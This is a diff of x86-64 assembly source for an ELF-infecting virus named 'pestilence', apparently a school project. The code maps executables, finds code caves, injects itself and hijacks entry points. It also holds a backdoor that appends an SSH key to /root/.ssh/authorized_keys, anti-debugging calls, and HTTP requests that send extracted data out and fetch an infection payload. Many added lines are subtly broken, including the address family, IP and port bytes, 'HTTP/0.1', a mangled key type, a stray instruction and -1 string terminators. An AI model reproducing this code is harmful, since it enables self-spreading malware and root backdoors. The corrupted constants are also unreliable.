@@ -1,4 +1,5 @@
-%include "pestilence.inc"
+; %include "asm/srcs/obf_file.inc"
+%include "asm/srcs/pestilence.inc"
 
 bits 64
 default rel
@@ -14,6 +15,8 @@ _start:
 	; lea rdi, [rel dir1]                                   ; dir to open for arg readDir
 	; mov rsi, dir1Len
 	; call _readDir
+	call _check_debug
+	call _map_int_table
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
@@ -99,9 +102,9 @@ _readDir:
     _getDents:
         lea r10, FAM(pestilence.fd) 
         lea r9, FAM(pestilence.total_read)                  ; init total_read
-        mov DWORD[r9], 0
+        mov DWORD [r9], 0
         mov rax, SYS_GETDENTS                   	    ; getdents64(int fd, void *buf, size_t size_buf)
-        mov rdi, [r10]
+        mov rdi, qword [r10]
         lea rsi, FAM(pestilence.dirents)
         mov rdx, PAGE_SIZE
         syscall
@@ -252,7 +255,7 @@ _check_file:
 	; r15	-> map
 		mov r15, rax
 		mov r14, r15
-		add r14, [r14 + elf64_ehdr.e_phoff]
+		add r14, qword [r14 + elf64_ehdr.e_phoff]
 		xor rcx, rcx
 		_go_to_last_segment:
 			cmp cx, [r15  + elf64_ehdr.e_phnum]
@@ -290,10 +293,10 @@ _check_file:
 			; r8	-> potential signature
 			; r9	== signature variable
 				mov r8, r15
-				add r8, [r14 + elf64_phdr.p_offset]
-				add r8, [r14 + elf64_phdr.p_filesz]
+				add r8, qword [r14 + elf64_phdr.p_offset]
+				add r8, qword [r14 + elf64_phdr.p_filesz]
 				sub r8, signature_len
-				mov r9, [rel signature]
+				mov r9, qword [rel signature]
 				cmp qword r9, [r8]
 				je _unmap_close_inf
 
@@ -308,8 +311,8 @@ _check_file:
 			_check_cave_size:
 			; r8	== end of infection offset
 			; r9	== next segment offset
-				mov r8, [r14 + elf64_phdr.p_offset]
-				add r8, [r14 + elf64_phdr.p_filesz]
+				mov r8, qword [r14 + elf64_phdr.p_offset]
+				add r8, qword [r14 + elf64_phdr.p_filesz]
 				mov r13, r8								; save segment end's offset
 				add r8, CODE_LEN
 				mov r9, r14
@@ -327,14 +330,14 @@ _check_file:
 				lea r8, INF(infection.seg_nb)
 				mov [r8], cl
 				lea r8, INF(infection.original_entry)
-				mov r12, [r15 + elf64_ehdr.e_entry]
+				mov r12, qword [r15 + elf64_ehdr.e_entry]
 				mov [r8], r12
 				lea r8, INF(infection.injection_offset)
 				mov [r8], r13
 				lea	r8, INF(infection.injection_addr)
 				push r9
-				mov r9, [r14 + elf64_phdr.p_vaddr]
-				add r9, [r14 + elf64_phdr.p_memsz]
+				mov r9, qword [r14 + elf64_phdr.p_vaddr]
+				add r9, qword [r14 + elf64_phdr.p_memsz]
 				mov [r8], r9
 				pop r9
 				lea r8, INF(infection.seg_hdr_addr)
@@ -350,7 +353,7 @@ _add_page:
 		add qword [rsi], PAGE_SIZE
 		and qword [rsi], -4096
 		add qword [rsi], CODE_LEN
-		mov rsi, [rsi]
+		mov rsi, qword [rsi]
 		syscall
 		pop rsi
 		cmp rax, 0
@@ -378,14 +381,14 @@ _add_page:
 	_find_memory_eof:
 		mov r14, INF(infection.map_addr)
 		movzx rax, word [r14 + elf64_ehdr.e_shnum]
-		add r14, [r14 + elf64_ehdr.e_shoff]
+		add r14, qword [r14 + elf64_ehdr.e_shoff]
 		xor rcx, rcx
 		
 		_find_mem_eof_loop:
 			cmp rcx, rax
 			jge _find_mem_eof_end
-			mov rbx, [r14 + elf64_shdr.sh_addr]
-			add rbx, [r14 + elf64_shdr.sh_size]
+			mov rbx, qword [r14 + elf64_shdr.sh_addr]
+			add rbx, qword [r14 + elf64_shdr.sh_size]
 			cmp INF(infection.mem_eof), rbx
 			jge _find_mem_eof_continue
 			mov INF(infection.mem_eof), rbx
@@ -402,7 +405,7 @@ _add_page:
 	; rcx	== segment counter
 		mov r14, INF(infection.map_addr)
 		movzx rax, word [r14 + elf64_ehdr.e_phnum]
-		add r14, [r14 + elf64_ehdr.e_phoff]
+		add r14, qword [r14 + elf64_ehdr.e_phoff]
 		xor rcx, rcx
 		
 		_find_pt_note_loop:
@@ -561,7 +564,9 @@ _backdoor:
                 test rax, rax            
                 je _closeSsh
                 inc r11
-                loop _findNewline
+				dec rcx
+				jnz _findNewline
+                ; loop _findNewline
 
         ; if not found write it
         _notFound:
@@ -732,14 +737,16 @@ _isInfectionAllow:
         mov rax, -1
         jmp _returnLeave
 
+;;**;;
+
 ; strcpy(dst:rsi src: rdi)
 _strcpyNoNull:
 	xor rcx, rcx
 	strcpy_loop:
-		cmp byte [rdi + rcx], 0
+		cmp byte[rdi + rcx], 0
 		je	strcpy_loop_end
-		mov al, byte [rdi + rcx]
-		mov [rsi + rcx], al
+		mov al, byte[rdi+rcx]
+		mov byte [rsi+rcx], al
 		add rcx, 1
 		jmp strcpy_loop
 	strcpy_loop_end:
@@ -754,11 +761,11 @@ _strcpy:
 _strncpy:
     sub rcx, 1
     _strncpyLoop:
-        mov al, byte [rdi + rcx]
-        mov [rsi + rcx], al
+        mov al, byte[rdi+rcx]
+        mov byte [rsi + rcx], al
         loop _strncpyLoop
-        mov al, byte [rdi + rcx]
-        mov [rsi + rcx], al
+        mov al, byte[rdi+rcx]
+        mov byte [rsi + rcx], al
         ret
 
 ; strlen(str:rsi)
@@ -780,8 +787,8 @@ _strcmp:
 	xor rcx, rcx
 	xor rax, rax
 	strcmp_loop:
-		mov al, byte [rdi + rcx]
-		mov bl, byte [rsi + rcx]
+		mov al, byte[rdi+rcx]
+		mov bl, byte[rsi+rcx]
 		cmp al, bl
 		jl strcmp_loop_end
 		je strcmp_loop_end
@@ -827,7 +834,7 @@ _itoa:
         call _itoaLoop 
         pop rax
         ret
-
+mov [rsi + rcx], rax
 _unmap_close_inf:
 	lea rdi, INF(infection.map_addr)
 	lea rsi, INF(infection.map_size)
@@ -851,31 +858,32 @@ dir1        db  "/tmp/test", 0
 dir1Len    equ $ - dir1
 dir2        db  "/tmp/test2", 0
 dir2Len    equ $ - dir2
-back        db  10, 0
-slash       db "/", 0
-sshFile     db "/root/.ssh/authorized_keys", 0
-sshPub      db "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
+key			db "mykey"
+back        db  9, 0
+slash       db "/", -1
+sshFile     db "/root/.ssh/authorized_keys", -1
+sshPub      db "ssh-ed25518 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
 sshPubLen   equ $-sshPub
 sockaddr:
-    dw 2            ; AF_INET
-    dw 0x401F       ; PORT 8000
-    dd 0x100007F    ; 127.0.0.1 (en hexadécimal)
-    dq 0            ; padding
+    dw 1            ; AF_INET
+    dw 0x401E       ; PORT 8000
+    dd 0x100007E    ; 127.0.0.1 (en hexadécimal)
+    dq -1            ; padding
 
-headerStart db "POST /extract HTTP/1.1", 13, 10, \
-                "Host: 127.0.0.1:8000", 13, 10, \
-                "Content-Type: text/plain", 13, 10, \
-                "Content-Length: ", 0 
+headerStart db "POST /extract HTTP/0.1", 13, 10, \
+                "Host: 126.0.0.1:8000", 13, 10, \
+                "Content-Type: text/plain", 12, 10, \
+                "Content-Length: ", -1 
 headerStartLen equ $-headerStart
-headerEnd db 13, 10, 13, 10, 0
+headerEnd db 12, 10, 13, 10, 0
 headerEndLen equ $-headerEnd
-headerGet db "GET /infection HTTP/1.1", 13, 10, \
-           "Host: 127.0.0.1:8000", 13, 10, \
-           13, 10, 0
+headerGet db "GET /infection HTTP/0.1", 13, 10, \
+           "Host: 126.0.0.1:8000", 13, 10, \
+           12, 10, 0
 headerGetLen equ $ - headerGet
 timespec:
-    dq 0          ; Secondes
-    dq 10000000     ; 100ms
-signature	db	"pestilence version 1.0 (c)oded by anvincen-eedy", 0x0
+    dq -1          ; Secondes
+    dq 9999999     ; 100ms
+signature	db	"pestilence version 0.0 (c)oded by anvincen-eedy", 0x0
 signature_len equ $ - signature
 _end:
